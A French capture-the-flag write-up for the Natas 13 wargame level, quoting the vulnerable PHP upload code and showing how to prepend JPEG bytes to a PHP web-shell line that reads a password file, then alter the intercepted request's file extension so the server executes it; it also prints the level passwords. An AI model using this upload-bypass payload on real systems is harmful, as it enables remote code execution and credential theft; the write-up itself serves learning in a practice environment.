username : natas13
password : trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC

On est sur un challenge qui ressemble au 12, on sait qu'il va falloir jouer avec du php et du jpeg.

- On a ce code : 
```php 

<?php
function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";
    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }
    return $string;
}
function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}
function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}
if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<?php } ?>
```

- On est obligé d'upload du .jpg On va donc inserer du code php dans un payload.jpg

1) On crée une image jpg : ```convert -size 1x1 xc:white minimal.jpg ```
2) On ajoute le code php a la fin du fichier : ```echo '<?php system("cat /etc/natas_webpass/natas14"); ?>' >> minimal.jpg```
3) On verifie que notre fichier contient bien le code php ```hexdump -C minimal.jpg```
4) On copie notre jpg vers un autre fichier qui sera notre payload : ```cp minimal.jpg payload.jpg```
5) On va sur le site du challenge on upload notre payload et on intercepte la requetes.
6) La requete ressemble a ca : ```
		-----------------------------372261520933639383623932280570
		Content-Disposition: form-data; name="MAX_FILE_SIZE"
		
		1000
		-----------------------------372261520933639383623932280570
		Content-Disposition: form-data; name="filename"
		
		5rh9qcyqgt.jpg <----- ON MODIFIE CETTE LIGNE EN .PHP POUR QUE LE SERVEUR L'EXECUTE
		-----------------------------372261520933639383623932280570
		Content-Disposition: form-data; name="uploadedfile"; filename="payload.jpg"
		Content-Type: image/jpeg
		
		ÿØÿà JFIF        ÿÛ C 	
		
					
		
				
		
		
		ÿÀ    ÿÄ                 	ÿÄ                 ÿÚ   ? TßÿÙ<?php system("cat /etc/natas_webpass/natas14"); ?>
	
	-----------------------------372261520933639383623932280570--
7) On va sur l'url donné en .php
Mot de passe : **z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ**